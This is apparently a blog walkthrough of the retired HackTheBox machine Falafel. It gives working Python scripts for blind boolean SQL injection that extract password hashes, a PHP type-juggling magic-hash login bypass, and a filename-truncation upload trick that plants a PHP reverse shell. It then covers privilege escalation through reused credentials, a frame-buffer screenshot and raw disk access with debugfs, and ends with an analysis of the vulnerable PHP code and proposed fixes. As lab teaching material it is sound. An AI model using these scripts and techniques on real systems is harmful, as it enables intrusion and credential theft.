---
title: HackTheBox - Falafel Writeup w/o Metasploit
date: 2020-07-18 14:46:16
tags: [walkthrough, hackthebox, sql injection, boolean sql injection, oscp-more, oswe-like]
---

# HackTheBox - Falafel Writeup w/o Metasploit

## Introduction
Falafel is a retired HackTheBox machine and one of the most interesting machines I have hacked on the platform. It is a Linux machine with some really fun vulnerabilities to exploit. The machine is rated hard but the author was kind enough to give us hints as we hack through it. The machine requires you to know a range of nuances from SQLi to Linux filesystems. Let's jump right in.

![Falafel](/HackTheBox/htb-falafel-writeup-w-o-metasploit/0.png)

## Reconnaissance 

### General Enumeration
We'll start our reconnaissance with few nmap scans. Starting with the initial scan.

![Nmap Initial Scan](/HackTheBox/htb-falafel-writeup-w-o-metasploit/1_nmap1.png)

We see that we have two services on our hand: SSH and HTTP. Since SSH is present, you can fairly guess that it's a Linux machine. Let's perform our targeted scan on these two ports.

![Nmap Targeted Scan](/HackTheBox/htb-falafel-writeup-w-o-metasploit/1_nmap3.png)

From the SSH version information we can say that the OS is potentially Ubuntu Xenial 16.04 LTS. With the Apache server version our guess gets stronger. We get a custom title, which is nice but in the robots.txt it shows that the web server wanna hide some text files, so let's look for text files.

### SSH Enumeration

Another way we could have gotten the SSH verion:

![SSH Manual Enumeration](/HackTheBox/htb-falafel-writeup-w-o-metasploit/2_ssh_enum.png)

We can see that there's no other information other than that.

### HTTP Enumeration

Another way we could have gotten HTTP server version is using curl:

![HTTP Manual Enumeration](/HackTheBox/htb-falafel-writeup-w-o-metasploit/2_http_enum.png)

In the first page itself it seems like we have some PHP files on our hand, which is nice.

![PHP Files](/HackTheBox/htb-falafel-writeup-w-o-metasploit/2_http_enum2.png)

Let's enumerate the web for text files using gobuster, which would look for directories too:

```
gobuster dir -u 10.10.10.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -o go_med_txt
```

![Gobuster Output](/HackTheBox/htb-falafel-writeup-w-o-metasploit/3_web_recon.png)

Nothing can catch my attention faster than "cyberlaw.txt". As a side note, don't do crime.

![cyberlaw.txt](/HackTheBox/htb-falafel-writeup-w-o-metasploit/4_cyberlaw.png)

From the text file we get a lot of information. Turns out there are two users on this website admin and chris, and chris is able to login as admin without knowing admins' credential (could be an SQLi) as well as gain access to the machine. There are a lot of mail addresses on this message, but apparently no mail service is found, could be something internal.

## Website Access

### Blind Boolean SQL Injection - Extracting Passwords

#### Identification

After going through application, `/login.php` was the only endpoint with which a user can interact, and with a database that too.

Sending `admin : admin`

![Wrong Identification](/HackTheBox/htb-falafel-writeup-w-o-metasploit/5_login1.png)

Looks like we can do user enumeration.

##### User Enumeration

Let's assume that we did not know that a user named chris existed, we could enumerate for users existed on this website using `wfuzz`

```
wfuzz -c -d "username=FUZZ&password=n00bsec" -w /usr/share/seclists/Usernames/Names/names.txt -u http://10.10.10.73/login.php
```

![Wfuzz Check](/HackTheBox/htb-falafel-writeup-w-o-metasploit/5_userenum1.png)

Now that we know that wfuzz works, and we can guess that it's not possible for every user came consecuively from the wordlist is not possible, let's filter results as per number of characters - 7074

```
wfuzz -c -d "username=FUZZ&password=n00bsec" -w /usr/share/seclists/Usernames/Names/names.txt -u http://10.10.10.73/login.php --hh 7074
```

![User Enumeration](/HackTheBox/htb-falafel-writeup-w-o-metasploit/5_userenum2.png)

#### Testing
We'll start with testing now.

Testing with a single-quote first. Sending `admin':admin`

![Try Again](/HackTheBox/htb-falafel-writeup-w-o-metasploit/5_login2.png)

*Try again..* error.

Let's test a single-quote and a comment. We'll comment out after the single-quote and see if that changes anything.

![Wrong Identification](/HackTheBox/htb-falafel-writeup-w-o-metasploit/5_login1.png)

We get *Wrong identification : admin* error again. With this we can say that we have an sql injection on our hand.

#### Exploitation

Next step would be get the number of columns, but UNION is blocked regardless of what you do or try any kind of bypass. We could use ORDER BY to get the number of columns but clearly this is not an error-based SQL injection. Since we cannot use UNION, getting the number of columns does not make sense.

Although we cannot dump credentials out on the screen, it does not mean we cannot extract data out.

Since this is a SQL database, we could use *substring* - `substring(string, position, length)` function. As the name suggests, substring function takes a "string", or a column (like in this case), along with position, and length, and prints out the characters of a string (or column) from the position and length you specify.

Let's test it with the username field to get a gist, since we know that "admin" exist

!["Right" Error](/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub1.png)

It's important to keep in mind that when our SQL injection is working, we get the error "Wrong identification", and when it does not, we get an error "Try again".

Similarly, we can extract the hashes of the users present in here.

We'll test for [a-f0-9] (because hashes) for each character position for the password column, and if we get the error "Wrong identification", then it would indicate that for position X the password column has that character.

##### Hash Extraction - BurpSuite Edition

This can be done in BurpSuite Intruder, even in Community Edition which is what I use, let's take a look at finding the first character of the admin's hash.

First we select a login request in BurpSuite and "Send it to intruder" and set our payload position:

![Setting Payload Position](/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub_burp1.png)

Next step to set a payload, we'll select Brute Forcer. Modify the character set, as below:

![Setting Payload](/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub_burp2.png)

To make our life easier, we could put the "right" error string in the "Grep Match" section so that the request that matches as per our error will get marked.

![Grepping Error](/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub_burp3.png)

We're now ready to "Start Attack"ing. Once we do, we soon find that the first character of the admins' hash is zero (0). We can now pause the attack since we already got what we needed from this injection.

![Getting The First Character](/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub_burp4.png)

We were successfully able to leverage BurpSuite Intruder to extract the first character of admins' hash and can see that it is "0" (Zero).

##### Hash Extraction - Python Edition

*Note: Link to the scripts are at the bottom*

Although this is nice and we can perform a little more tweaking and get the entire hash, it would be a LOT faster if we whipped up a script of our own and got this done, which is what we will be doing now.

I wrote a script in python to get the admin's hash.

``` python
# Importing necessary library
import requests

# This function generates SQL injection payload to fetch the hash, for each index (i) and character (c) passed to the function
def SQLpayload(i,c):
    return "admin' AND substring(password,%s,1)='%s'-- -" % (i,c)


# All the characters in a hash
characters = 'abcdef0123456789'

password = '' # Blank password string

# Loop through every index position : 1 to 32
for i in range(1,33):
# Loop through every character in the "characters" for each index position
    for c in characters:
    # Defining a payload to be sent to the server
        payload = {'username':SQLpayload(i,c), 'password':'n00bsec'}
        # Sending a post request with the above payload and it's data and response is saved in "r"
        r = requests.post('http://10.10.10.73/login.php',data=payload)
        # Checking if "right" error is hit at an index for a character
        if "Wrong identification" in r.text:
        # If right error is hit, add the character to the password string
            password += c
            # Print the character on the screen without adding a "\n" - newline
            print(c,end='',flush=True)
            # No need to cycle through the rest of the characters if the "right" error is already hit for an index position
            break

# Print the hash
print('\nHash is:\t'+password+'\n')
```

Once we run the script we get the admin users' hash.

![Hash Extracted](/HackTheBox/htb-falafel-writeup-w-o-metasploit/9_auto1.png)

Although this script works, it takes quite some time to run. So I created another script which would perform some extra queries to the database before it checks whether a character is in users' hashs' X position or not.

The first check is to find if the character in X position is an alphabet or not. If so, it is checked if it belongs to [a-f] group or the rest. If it's a hash, it'll always belong to a-f group which is "alpha1" in the below code.
If it's not an alphabet, it's checked if the number belongs to [0-4] group or [5-9].
Once the group is sent back, SQLstring is used to generate payloads for characters in only those groups for X position. This reduces the amount of requests sent to the server, and we extract the hash much faster.

These checks are done using "ord". Ordinal numbers are just decimal numbers. We convert the output of the substring to ord and perform a check if it's greater than 58, ascii(9) = decimal(57), thus checking if the character in that position is an alphabet.

| Numbers (dec hex ascii) | Alphabets (dec hex ascii) |
|-------------------|-------------------|
| ![](/HackTheBox/htb-falafel-writeup-w-o-metasploit/13_ord1.png) | ![](/HackTheBox/htb-falafel-writeup-w-o-metasploit/13_ord2.png) |

Check out `man ascii` to view the entire table.

``` python
import requests


def SQLstring(i,c):
    # We only want 1 password character at a time
    # Final payload will look like (example 1st chars)
    # username:admin' AND substring(password,1,1)='a'
    return "admin' AND substring(password,%s,1)='%s'-- -" % (i,c)


def SQLsplit(i):
    # Checking if the character is an alphabet
    sql = "admin' AND ord(substring(password,%s,1)) > '58'-- -" % i
    payload = {'username':sql, 'password':'abcd'}
    r = requests.post('http://10.10.10.73/login.php', data=payload)
    if "Wrong identification" in r.text:
    # Checking if it's beyond "f"
        sql = "admin' AND ord(substring(password,%s,1)) > '102'-- -" % i
        payload = {'username':sql, 'password':'abcd'}
        r = requests.post('http://10.10.10.73/login.php', data=payload)
        if "Wrong identification" in r.text:
            return "alpha2"
        else:
        # If not beyond "f"
            return "alpha1"
    # Character is a number
    else:
    # Checking if number is less than "5"
        sql = "admin' AND ord(substring(password,%s,1)) < '53'-- -" % i
        payload = {'username':sql, 'password':'abcd'}
        r = requests.post('http://10.10.10.73/login.php', data=payload)
        if "Wrong identification" in r.text:
            return "num1"
        else:
        # If number is greater than 5
            return "num2"


# password could be in hashed format or plaintext
alpha1 = 'abcdef'
alpha2 = 'ghijklmnopqrstuvwxyz'
num1 = '01234'
num2 = '56789'

# Password variable
passwd = ''

for i in range(1,33):
    if SQLsplit(i) == "alpha1":
        for a in alpha1:
            payload = {'username':SQLstring(i,a), 'password':'abcd'}
            r = requests.post('http://10.10.10.73/login.php', data=payload)
            if "Wrong identification" in r.text:
                passwd += a
                print(a,end='',flush=True)
                break

    elif SQLsplit(i) == "alpha2":
        for a in alpha2:
            payload = {'username':SQLstring(i,a), 'password':'abcd'}
            r = requests.post('http://10.10.10.73/login.php', data=payload)
            if "Wrong identification" in r.text:
                passwd += a
                print(a,end='',flush=True)
                break
            
    elif SQLsplit(i) == "num1":
        for n in num1:
            payload = {'username':SQLstring(i,n), 'password':'abcd'}
            r = requests.post('http://10.10.10.73/login.php', data=payload)
            if "Wrong identification" in r.text:
                passwd += n
                print(n,end='',flush=True)
                break

    
    else:
        for n in num2:
            payload = {'username':SQLstring(i,n), 'password':'abcd'}
            r = requests.post('http://10.10.10.73/login.php',data=payload)
            if "Wrong identification" in r.text:
                passwd += n
                print(n,end='',flush=True)
                break


# print('\n')
print('\nPass or Hash is:\t'+passwd+'\n')
```

The above script is not perfect, maybe you could make it even more dynamic.

Running this script to get the admins' hash:

![Admins' Hash Extracted](/HackTheBox/htb-falafel-writeup-w-o-metasploit/9_auto2.png)

By making a script with extra checks, it helped us save 38 seconds for just one account, if there were a lot of accounts in here that would add up to some considerable amount of time saved.

Made necessary changes and then fetched chris' hash:

![Chris' Hash Extracted](/HackTheBox/htb-falafel-writeup-w-o-metasploit/9_auto3.png)

For the second user we were only able to save a meagre 2 seconds, but it's still something right? ¯\\\_(ツ)_/¯

You might wonder if making such a large script compared to the earlier one is worth it, especially for a CTF. The answer is mostly no since the first works just fine. Making a more finer and dynamic script would improve your scripting skills, which is a very important skill to have in the industry and so developing scripts is encouraged.

Now that we have found both the hashes, let's crack them. We successfully crack the chris' hash and a password - ***juggling*** but unable to crack admins' hash. Let's check out chris' account while we are at it.

![Chris' Account](/HackTheBox/htb-falafel-writeup-w-o-metasploit/10_chris.png)

There's nothing much here, except some more hints towards cracking admins' hash - PHP Type Juggling.

### PHP Type Juggling - Cracking Admins' Hash 

In the "cyberlaw.txt" file, we saw that chris was able to log into admins' account without knowing the password and it certainly wasn't an SQL injection to bypass authentication. Chris's password hints at juggling and his account tells us that he works as a juggler and that *sometimes both the hobby and work have something in common*.

But let's say we didn't have any of those hints to point towards PHP type juggling.

When we take a closer look at admins' hash, it does look a bit odd. It looks more like a massive number than a hash, and this massive number corresponding to 0 * 10<sup>4620..</sup> resulting to , you guessed it, 0 (zero). If you wanna try to get a number like that, take a calculator and multiply two biggest numbers the calculator can fit in and look at the result.

This by default wouldn't introduce any kind of vulnerability, but PHP is a "loosely-typed" language. A loosely-typed language is one wherein there is no mention of datatype when defining a variable. Now since no datatype is specified, PHP will try to convert one thing to another (string to integer, integer to float, etc.) when loose comparisons ("==") are used.

Loose comparisons would convert one thing to another and then perform comparison, rather than performing the comparison as-is. So when a string (admins' hash) is loosely compared to a number, PHP would convert it to a number first (causing the admin hash to become 0 (zero)) and then it will perform the comparison. If we send in any other thing whose hash look like admins' - "0e..." it would also result in zero, both the hashes would "match", and PHP will log us in.

If you want to learn more about PHP type juggling, [PHP Magic Tricks: Type Juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf) is a good talk (pdf) to checkout

Let's look for a number that would also result in a similar "0e.." like hash to send to the PHP. The reason why we're looking for something would result in that hash instead of justing sending 0 is because PHP would be converting whatever we send in to a hash first, and hash of 0 won't give us what we want.

Upon searching "php 0e hash collision", I find a page which has some strings and number listed that result in "0e..." type hash.

![0e Type Hashes](/HackTheBox/htb-falafel-writeup-w-o-metasploit/11_hash.png)

Let's try "240610708" and see if it logs us in as admin.

![Admins' Account](/HackTheBox/htb-falafel-writeup-w-o-metasploit/12_admin.png)

And we successfully log in as admin. We are immediately presented with an upload functionality, which from "cyberlaw.txt" we know is vulnerable.

## Initial Access - Exploiting Upload Functionality

First step to understand something is to use as an end-user would.

Uploading a legitimate image "google.png" to the server

![](/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload1.png)

![](/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload2.png)

We now know that it's using wget functionality of the linux to get the file.

![](/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload3.png)

Actually uploads the file as is.

Unfortunately you cannot keep some weird name of the file to upload as and inject the wget command that the server is running. Another thing we could do is see what would happen if we give it a file which is 255 characters long. In Linux, almost all the file related commands are restricted at 255 character length.

Created a 255 character long string using msf pattern create, remove last 4 characters and then create a png file.

![Create Unique File](/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_1.png)

Start a HTTP server, I'm using a python3 server, and upload the file.

![File Uploaded](/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_2.png)

Let's see how the file is saved as, since the uploaded files' name has been shortened.

![File Saved As](/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_3.png)

To get the offset, file length, we only care about the last 4 characters.

![Offset Found](/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_4.png)

We found the offset of the unique string uploaded, thus the filename will get shortened if length increases from 232 characters removing any extension present.

Created a string with 232 A's ( `python -c "'A'*232"` ) and appended "test.png", created a file as that name, and uploaded it.

![Test File Uploaded](/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_5.png)

Checking how it is saved as.

![File Saved As](/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_6.png)

It has stripped the extension out. Let's rename the existing test file, replacing "test" with ".php".
The file has contents as follows, and is uploaded.

![PHPInfo File Uploaded](/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_7.png)

Checking how it is saved as.

![PHPInfo File Saved As](/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_8.png)

We have successfully saved the file with PHP extension. Let's browse to this file.

![PHPInfo](/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_9.png)

PHPInfo function loads perfectly. Now let's copy a php reverse shell to PHPInfo test file we uploaded.
I've added "GIF89a;" as the first line of this file for safety reasons, and modified it as necessary.

![Uploading Shell](/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload5.png)

Once the file is uploaded, we'll browse to it while our listener is on.

![Getting A Shell](/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload6.png)

We have successfully gotten a shell as `www-data` user.

## Privilege Escalation

![](/HackTheBox/htb-falafel-writeup-w-o-metasploit/.png)

### Escalating To Moshe

First step is to always look for database credentials.

![Database Credentials](/HackTheBox/htb-falafel-writeup-w-o-metasploit/15_db.png)

We got a password for a user "moshe". Let's see if our friend moshe re-used their password.

![Privilege Escalation 1](/HackTheBox/htb-falafel-writeup-w-o-metasploit/16_privesc1.png)

And they did. We succesfully escalate our privileges from **www-data** to **moshe**. Let's see if we can login via SSH.

![Login Via SSH](/HackTheBox/htb-falafel-writeup-w-o-metasploit/17_ssh.png)

And we can. Logging in via SSH ensures that we get the most functional shell on the system, this is important in order to use various commands like sudo.

### Escalating To Yossi

Let's enumerate the machine as moshe. Checking home directory. 

![User.txt](/HackTheBox/htb-falafel-writeup-w-o-metasploit/18.png)

We found user.txt, and it's readable, but that's no fun. We'll come back once we're root.
Continuing with enumeration using `LinEnum.sh`.

![Groups](/HackTheBox/htb-falafel-writeup-w-o-metasploit/19_groups.png)

Having so many groups is quite odd. Let's look at all the files we or our groups own, apart from some. The `grep` removal of some files is done after the default results are reviewed once and decided that some files are not worth looking into.

``` bash
## Before
for i in $(groups);do echo -e "\n==========$i=========="; find / -group $i 2>/dev/null; done

## After
for i in $(groups);do echo -e "\n==========$i=========="; find / -group $i 2>/dev/null | grep -v "proc\|lib\|run\|sys"; done
```

!["adm" Group](/HackTheBox/htb-falafel-writeup-w-o-metasploit/20_group1.png)

We have quite some logs on hand here.

!["video" Group](/HackTheBox/htb-falafel-writeup-w-o-metasploit/20_group2.png)

Video files are something I have never worked with and certainly looks more odd than logs, and so I will look at these first and then logs.

By researching "/dev/fb0", it turns out that it is a Frame Buffer Device. "The frame buffer device provides an abstraction for the graphics hardware." More about frame buffer device can be learned from the [Kernel Documentation](https://www.kernel.org/doc/Documentation/fb/framebuffer.txt).

A thing that caught my eye out of curiousity was that you can take screenshots with this device itself, sounds pretty cool right? The contents of the screenshot are IN the device file, we can `cat` it to get its contents to some file.

I searched how to use frame buffer and see if it is used and `dmesg` logs if you have accessed it.

![Frame Buffer Log](/HackTheBox/htb-falafel-writeup-w-o-metasploit/21_frame1.png)

Saving the contents of the frame buffer to a file

![Cat Screenshot](/HackTheBox/htb-falafel-writeup-w-o-metasploit/21_frame2.png)

Looks like we have quite some data here (~ 4 Mb), could easily be a 720p image. Let's transfer this image to our machine.

![Image Transferred](/HackTheBox/htb-falafel-writeup-w-o-metasploit/21_frame3.png)

![Checking File](/HackTheBox/htb-falafel-writeup-w-o-metasploit/21_frame3_2.png)

To work with this I installed `gimp`. Since we do not know which kind of file it's and gimp did not automatically identify it as some extension.

![Open Image As Raw Data](/HackTheBox/htb-falafel-writeup-w-o-metasploit/21_frame4.png)

Once opening the image there are not much parameters to mess with, the only parameter that changes the image a lot is "width".

![Almost](/HackTheBox/htb-falafel-writeup-w-o-metasploit/21_frame5.png)

At 941 width the image makes a lot more sense than from where we started with. Looks like a screenshot of *yossi* user changing their password. Let's keep going up.

![Screenshot](/HackTheBox/htb-falafel-writeup-w-o-metasploit/21_frame6.png)

At 1176 width the images is perfect. And we have the password of another user, time to escalate your privileges!

While I was looking more into frame buffer screenshot, it turns out we could have saved some time by actually checking with what resolution a screenshot was taken with instead of all the guess work.

![Screenshot Resolution](/HackTheBox/htb-falafel-writeup-w-o-metasploit/21_frame7.png)

Let's change the user to yossi using `su`

![Escalated To Yossi](/HackTheBox/htb-falafel-writeup-w-o-metasploit/22_privesc2.png)

Now that we have escalated our privileges to yossi, let's get to enumeration again. If you remember, like moshe, yossi themselves had quite a lot of groups, so let's start there.

### Escalating To Root

We will issue the same command as before to list all the files owned by groups yossi is a part of.

``` bash
for i in $(groups);do echo -e "\n==========$i=========="; find / -group $i 2>/dev/null; done
```

![Disks Group](/HackTheBox/htb-falafel-writeup-w-o-metasploit/23_groups.png)

Out of all, the disks group was the most interesting to me. We have access to ***/dev/sda1***! It is the main partition of the Linux filesystem in which all the data is stored, we could get access to every single file that is present on the system, including shadow and roots' ssh key (if that exists)!

![SDA1 Permissions](/HackTheBox/htb-falafel-writeup-w-o-metasploit/24_perms.png)

We not only have read access, but also write access. The way to access this file to get hold of a file is using `debugfs`, which lets you debug a file partition as long as you have read access to it.

![Root SSH Key](/HackTheBox/htb-falafel-writeup-w-o-metasploit/25_root_ssh.png)

We got the roots' SSH private key, let's escalate our privileges. As a side note, `ls` actually works here, it just opens in a `less`-type way on the screen so it's not visible once you close it.

![Logged In As Root](/HackTheBox/htb-falafel-writeup-w-o-metasploit/26_root.png)


## Getting Loot

Now that we are root, let's go get our loot.

![Root.txt](/HackTheBox/htb-falafel-writeup-w-o-metasploit/27_flag0.png)

![User.txt](/HackTheBox/htb-falafel-writeup-w-o-metasploit/27_flag1.png)

![](/HackTheBox/htb-falafel-writeup-w-o-metasploit/28_shadow1.png)
![Shadow](/HackTheBox/htb-falafel-writeup-w-o-metasploit/28_shadow2.png)

## Extra - Vulnerability Analysis

### SQL Injection

All of the authentication and authorization logic is in the file: `login_logic.php`, which the endpoint `/login.php` includes in it. Contents of the file are as follows:

``` PHP
<?php                                                 
  include("connection.php");              
  session_start();                          
  if($_SERVER["REQUEST_METHOD"] == "POST") {                       
    if(!isset($_REQUEST['username'])&&!isset($_REQUEST['password'])){                                                                                        
      //header("refresh:1;url=login.php");
      $message="Invalid username/password.";                                                                                                                                                                                               
      //die($message);                     
      goto end;       
          }                                                                                                                                                                                                                                                                  
                                                          
    $username = $_REQUEST['username'];                             
    $password = $_REQUEST['password'];                                                                               
                                                          
    if(!(is_string($username)&&is_string($password))){    
      //header("refresh:1;url=login.php");                                                                                            
      $message="Invalid username/password.";
      //die($message);                    
      goto end;                              
    }                                   
                                                          
    $password = md5($password);              
    $message = "";                      
    if(preg_match('/(union|\|)/i', $username) or preg_match('/(sleep)/i',$username) or preg_match('/(benchmark)/i',$username)){                                                                                                                                                                                           
      $message="Hacking Attempt Detected!";  
      //die($message);                                                                                               
      goto end;                                                                                                      
    }                                         
                                                                                                                     
    $sql = "SELECT * FROM users WHERE username='$username'";                                                                          
    $result = mysqli_query($db,$sql);         
    $users = mysqli_fetch_assoc($result);                                                                                             
    mysqli_close($db);                   
    if($users) {
      if($password == $users['password']){
        if($users['role']=="admin"){                                                                                 
          $_SESSION['user'] = $username;
          $_SESSION['role'] = "admin";
          header("refresh:1;url=upload.php");                                                                                         
          //die("Login Successful!");
          $message = "Login Successful!";
        }elseif($users['role']=="normal"){
                                  $_SESSION['user'] = $username;                                                                                             
                                  $_SESSION['role'] = "normal";                                                                                              
          header("refresh:1;url=profile.php");
                                  //die("Login Successful!");                                                                                                
          $message = "Login Successful!";                          
        }else{                                                     
          $message = "That's weird..";                             
        }                                                                     
      }                                                                       
      else{                                                                   
        $message = "Wrong identification : ".$users['username'];                                                                                             
      }                                                                       
    }                                                                         
    else{                                                                     
      $message = "Try again..";                                               
    }                                                                         
    //echo $message;                                                          
  }                                                                           
  end:                                                                        
?>
```

On line 12, we can see that the username from our POST request is passed onto the PHP variable as-is.
Down on line 30, we see that this variable is put in the SQL query which would be passed to the database and it would execute our malicious query and return the data or information back.

On line 24, we can see why our UNION attacks did not work regardless of what we tried. If "union" string existed in the username parameter it'd immediately send us a message "Hacking Attempt Detected" and throw our request out.

On line 53, we see that we only get the message "Wrong identification", if we're meeting just the username part of the authentication and not the password part.

### Upload Page

`/upload.php`

``` PHP
<?php include('authorized.php');?>                                                                                                                                                                                                         
<?php                                                                                                                                                                                                                                      
 error_reporting(E_ALL);                                                                                                                                                                                                                   
 ini_set('display_errors', 1);                                                                                                                                                                                                             
 function download($url) {                                                                                                                                                                                                                 
   $flags  = FILTER_FLAG_SCHEME_REQUIRED | FILTER_FLAG_HOST_REQUIRED | FILTER_FLAG_PATH_REQUIRED;                                                                                                                                          
   $urlok  = filter_var($url, FILTER_VALIDATE_URL, $flags);                                                                                                                                                                                
   if (!$urlok) {                                                                                                                                                                                                                          
     throw new Exception('Invalid URL');                                                                                                                                                                                                   
   }                                                                                                                                                                                                                                       
   $parsed = parse_url($url);                                                                                                                                                                                                              
   if (!preg_match('/^https?$/i', $parsed['scheme'])) {                                                                                                                                                                                    
     throw new Exception('Invalid URL: must start with HTTP or HTTPS');                                                                                                                                                                    
   }                                                                                                                                                                                                                                       
   $host_ip = gethostbyname($parsed['host']);                                                                                                                                                                                              
   $flags  = FILTER_FLAG_IPV4 | FILTER_FLAG_NO_RES_RANGE;                                                                                                                                                                                  
   $ipok  = filter_var($host_ip, FILTER_VALIDATE_IP, $flags);                                                                                                                                                                              
   if ($ipok === false) {                                                                                                                                                                                                                  
     throw new Exception('Invalid URL: bad host');                                                                                                                                                                                         
   }                                                                                                                                                                                                                                       
   $file = pathinfo($parsed['path']);                                                                                                                                                                                                      
   $filename = $file['basename'];                                                                                                                                                                                                          
   if(! array_key_exists( 'extension' , $file )){                                                                                                                                                                                          
     throw new Exception('Bad extension');                                                                                                                                                                                                 
   }                                                                                                                                                                                                                                       
   $extension = strtolower($file['extension']);                                                                                                                                                                                            
   $whitelist = ['png', 'gif', 'jpg'];                                                                                                                                                                                                     
   if (!in_array($extension, $whitelist)) {                                                                                                                                                                                                
     throw new Exception('Bad extension');                                                                                                                                                                                                 
   }                                                                                                                                                                                                                                       
   // re-assemble safe url                                                                                                                                                                                                                 
   $good_url = "{$parsed['scheme']}://{$parsed['host']}";                                                                                                                                                                                  
   $good_url .= isset($parsed['port']) ? ":{$parsed['port']}" : '';                                                                                                                                                                        
   $good_url .= $parsed['path'];                                                                                                                                                                                                           
   $uploads  = getcwd() . '/uploads';                                                                                                                                                                                                      
   $timestamp = date('md-Hi');                                                                                                                                                                                                             
   $suffix  = bin2hex(openssl_random_pseudo_bytes(8));                                                                                                                                                                                     
   $userdir  = "${uploads}/${timestamp}_${suffix}";                                                                                                                                                                                        
   if (!is_dir($userdir)) {                                                                                                                                                                                                                
     mkdir($userdir);                                                                                                                                                                                                                      
   }                                                                                                                                                                                                                                       
   $cmd = "cd $userdir; timeout 3 wget " . escapeshellarg($good_url) . " 2>&1";                                                                                                                                                            
   $output = shell_exec($cmd);                                                                                                                                                                                                             
   return [                                                                                                                                                                                                                                
     'output' => $output,                                                                                                                                                                                                                  
     'cmd' => "cd $userdir; wget " . escapeshellarg($good_url),                                                                                                                                                                            
     'file' => "$userdir/$filename",                                                                                                                                                                                                       
   ];
    }  

 $error = false;  
 $result = false;  
 $output = '';  
 $cmd = '';  
 if (isset($_REQUEST['url'])) {  
   try {  
     $download = download($_REQUEST['url']);  
     $output = $download['output'];  
     $filepath = $download['file'];  
     $cmd = $download['cmd'];  
     $result = true; 
   } catch (Exception $ex) {  
     $result = $ex->getMessage();  
     $error = true;  
   }  
 }  
 ?>  
 <!DOCTYPE html>  
 <html>  
 <head>  
   <title>Falafel Lovers - Image Upload</title>  
   <?php include('style.php');?> 
        <?php include('css/style.php');?>
 </head>  
 <body>  
 <?php include('header.php');?>

 <br><br><br>
 <div style='width: 60%;margin: 0 auto; color:#303030'> 
<div class="container" style="margin-top: 50px; margin-bottom: 50px;position: relative; z-index: 99; height: 110%;background:#F8F8F8;box-shadow: 10px 10px 5px #000000;padding-left: 50px;padding-right: 50px;">
<br><br>
   <h1>Upload via url:</h1>  
   <?php if ($result !== false): ?>  
     <div>  
       <?php if ($error): ?>  
         <h3>Something bad happened:</h3>  
         <p><?php echo htmlentities($result); ?></p>  
       <?php else: ?>  
        <h3>Upload Succsesful!</h3> 
        <div>  
        <h4>Output:</h4>  
        <pre>CMD: <?php echo htmlentities($cmd); ?></pre>   
        <pre><?php echo htmlentities($output); ?></pre>
        </div>  
       
       <?php endif; ?>  
       </div>
   <?php endif; ?>  
   <div>
        <p>Specify a URL of an image to upload:</p>  
     <form method="post">  
       <label>  
         <input type="url" name="url" placeholder="http://domain.com/path/image.png">  
       </label>  
       <input type="submit" value="Upload">  
     </form>  
<br><br>
 </div>
   </div>  
</div>
   <footer>  
   </footer>  
 </body>  
 </html>
```

If you saw this entire code and were trying to figure out where the vulnerability lies, it's in the way `wget` is used. This code apart from wget is pretty much secure from any kinda attacks as it's sanitizing the user-input very well.

One way to make this code secure would've been renaming the file that is being sent to download to random 4 characters, something like follows:

``` PHP
'cmd' => "cd $userdir; wget " . escapeshellarg($good_url) . " -O " . bin2hex(openssl_random_pseudo_bytes(4) . "$extension")
```

You could test this on your own machine too, serve the .PHP.PNG file and download it using wget

![Wget Fail](/HackTheBox/htb-falafel-writeup-w-o-metasploit/29_wget.png)

But if you make it save as some other name with the right extension, it would fix the vulnerability we faced.

![Wget fix](/HackTheBox/htb-falafel-writeup-w-o-metasploit/30_fix.png)

With this, the code won't be vulnerable anymore as wget is no longer performing any kind of shortening on its' own.

Another way to make this secure would've been to not use wget altogether, but rather using something else such as - `file_put_contents()` function of PHP.

Downloading remote files on the server with user controlling which files to be downloaded and browsed to makes a very tricky situation for a developer, and one misconfiguration or a mistake could lead to a compromised web server.

## Fin

Both the scripts are available in this [git repo](https://github.com/krnb/scripts).
If some part of it feels unexplained or you did not understand, feel free to contact me :)

Take care, have a great day, and keep hackin'!